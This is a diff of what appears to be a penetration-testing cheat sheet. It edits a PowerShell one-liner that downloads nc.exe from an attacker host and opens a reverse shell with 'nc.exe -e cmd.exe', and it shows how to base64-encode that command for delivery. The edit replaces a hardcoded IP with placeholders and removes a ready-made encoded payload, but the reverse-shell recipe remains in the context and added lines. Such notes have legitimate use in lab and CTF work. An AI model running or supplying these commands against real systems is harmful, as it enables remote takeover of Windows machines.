@@ -94,11 +94,9 @@ c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
 Quick encode on Linux:
 
 ```bash
-echo -n '(new-object net.webclient).downloadfile("http://10.10.17.8:4443/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.17.8 4444 -e c:\windows\system32\cmd.exe;' \
+echo -n '(new-object net.webclient).downloadfile("http://<ip>:<port>/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv <ip> <shell-port> -e c:\windows\system32\cmd.exe;' \
   | iconv -t UTF-16LE | base64 -w0
 ```
-
-KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA3AC4AOAA6ADQANAA0ADMALwBuAGMALgBlAHgAZQAiACwAIAAiAGMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGEAcwBrAHMAXABuAGMALgBlAHgAZQAiACkAOwBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANwAuADgAIAA0ADQANAA0ACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA=
 
 Then plug the output into:
 
